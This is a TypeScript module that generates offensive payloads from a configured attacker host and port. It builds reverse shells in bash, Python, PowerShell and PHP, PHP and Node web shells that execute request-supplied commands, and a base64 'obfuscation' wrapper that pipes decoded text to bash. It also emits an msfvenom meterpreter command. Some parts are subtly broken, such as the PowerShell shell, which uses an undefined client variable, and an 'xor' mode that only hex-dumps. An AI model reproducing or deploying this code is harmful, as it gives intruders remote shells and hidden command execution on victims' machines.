import crypto from "crypto";

export interface PayloadConfig {
  type: "reverse_shell" | "web_shell" | "payload_encoder" | "meterpreter";
  language: "bash" | "python" | "powershell" | "php" | "javascript";
  lhost: string;
  lport: number;
  obfuscate: boolean;
}

export interface GeneratedPayload {
  payload: string;
  type: string;
  language: string;
  obfuscated: boolean;
  size: number;
}

function obfuscatePayload(payload: string): string {
  // Simple obfuscation: base64 encode + variable renaming
  const encoded = Buffer.from(payload).toString("base64");
  const varName = `var_${crypto.randomBytes(4).toString("hex")}`;

  return `
# Obfuscated Payload
${varName}="${encoded}"
echo $${varName} | base64 -d | bash
  `.trim();
}

export function generateReverseShell(config: PayloadConfig): GeneratedPayload {
  let payload = "";

  switch (config.language) {
    case "bash":
      payload = `bash -i >& /dev/tcp/${config.lhost}/${config.lport} 0>&1`;
      break;
    case "python":
      payload = `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${config.lhost}",${config.lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`;
      break;
    case "powershell":
      payload = `powershell -NoP -NonI -W Hidden -Exec Bypass -Command "New-Object System.Net.Sockets.TCPClient('${config.lhost}',${config.lport});[byte[]]$null = 0..65535|%{$_.ToString()};$client.GetStream().Write($null,0,$null.Length);IEX([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('')))"`;
      break;
    case "php":
      payload = `php -r '$sock=fsockopen("${config.lhost}",${config.lport});exec("/bin/sh -i <&3 >&3 2>&3");'`;
      break;
    default:
      payload = `bash -i >& /dev/tcp/${config.lhost}/${config.lport} 0>&1`;
  }

  if (config.obfuscate) {
    payload = obfuscatePayload(payload);
  }

  return {
    payload,
    type: config.type,
    language: config.language,
    obfuscated: config.obfuscate,
    size: Buffer.byteLength(payload),
  };
}

export function generateWebShell(config: PayloadConfig): GeneratedPayload {
  let payload = "";

  switch (config.language) {
    case "php":
      payload = `<?php system($_GET['cmd']); ?>`;
      break;
    case "javascript":
      payload = `const express = require('express'); const app = express(); app.get('/cmd', (req, res) => { require('child_process').exec(req.query.cmd, (err, stdout) => { res.send(stdout); }); }); app.listen(${config.lport});`;
      break;
    default:
      payload = `<?php system($_GET['cmd']); ?>`;
  }

  if (config.obfuscate) {
    payload = obfuscatePayload(payload);
  }

  return {
    payload,
    type: "web_shell",
    language: config.language,
    obfuscated: config.obfuscate,
    size: Buffer.byteLength(payload),
  };
}

export function generatePayloadEncoder(config: PayloadConfig): GeneratedPayload {
  const encodingMethods = ["base64", "hex", "rot13", "xor"];
  const method = encodingMethods[Math.floor(Math.random() * encodingMethods.length)];

  const payload = `
# Payload Encoder - ${method}
# Usage: ./encode.sh <payload>

case "${method}" in
  base64)
    echo $1 | base64
    ;;
  hex)
    echo -n $1 | xxd -p
    ;;
  rot13)
    echo $1 | tr 'A-Za-z' 'N-ZA-Mn-za-m'
    ;;
  xor)
    echo $1 | od -An -tx1 | tr -d ' '
    ;;
esac
  `.trim();

  return {
    payload,
    type: "payload_encoder",
    language: "bash",
    obfuscated: false,
    size: Buffer.byteLength(payload),
  };
}

export function generatePayload(config: PayloadConfig): GeneratedPayload {
  switch (config.type) {
    case "reverse_shell":
      return generateReverseShell(config);
    case "web_shell":
      return generateWebShell(config);
    case "payload_encoder":
      return generatePayloadEncoder(config);
    case "meterpreter":
      return {
        payload: `# Meterpreter payload generation requires msfvenom\nmsfvenom -p windows/meterpreter/reverse_tcp LHOST=${config.lhost} LPORT=${config.lport} -f exe -o payload.exe`,
        type: "meterpreter",
        language: "bash",
        obfuscated: false,
        size: 0,
      };
    default:
      return generateReverseShell(config);
  }
}
